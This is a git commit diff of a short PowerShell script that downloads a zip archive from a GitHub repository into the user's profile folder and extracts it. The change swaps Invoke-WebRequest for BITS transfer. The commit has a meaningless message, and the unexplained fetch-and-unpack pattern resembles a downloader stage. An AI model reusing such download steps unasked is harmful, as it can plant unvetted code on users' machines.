de445d46629efcf3c5e24451d05106a1494e567c
Your Name <you@example.com>
2024-06-12 17:01:34 +0200

    ff

--- sk.ps1
+++ sk.ps1
@@ -1,6 +1,6 @@
 $fileUrl = "https://github.com/numeryczne/numeryczne/raw/main/plik.zip"
 $destinationPath = "$env:USERPROFILE\plik.zip"
-Invoke-WebRequest -Uri $fileUrl -OutFile $destinationPath
+Start-BitsTransfer -Source $fileUrl -Destination $destinationPath
 
 cd "$env:USERPROFILE"
 Add-Type -A 'System.IO.Compression.FileSystem'; [IO.Compression.ZipFile]::ExtractToDirectory('.\plik.zip', '.');
